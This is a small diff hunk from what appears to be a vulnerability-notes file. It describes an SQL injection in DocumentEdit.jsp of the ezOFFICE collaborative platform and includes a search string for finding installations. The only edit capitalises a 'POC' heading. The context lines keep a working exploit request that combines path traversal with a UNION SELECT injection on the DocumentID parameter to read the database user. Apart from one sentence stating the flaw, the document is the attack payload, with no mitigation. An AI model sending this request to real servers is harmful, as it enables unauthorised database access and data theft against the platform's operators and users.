@@ -7,7 +7,7 @@ DocumentEdit.jsp接口处存在sql注入漏洞，攻击者可获取数据库中�
 app="ezOFFICE协同管理平台"
 ```
 
-## poc
+## POC
 ```
 GET /defaultroot/iWebOfficeSign/OfficeServer.jsp/../../public/iSignatureHTML.jsp/DocumentEdit.jsp?DocumentID=1'%20union%20select%20null,null,(select%20user%20from%20dual),null,null,null,null,null,null,null%20from%20dual-- HTTP/1.1
 Host: your-ip
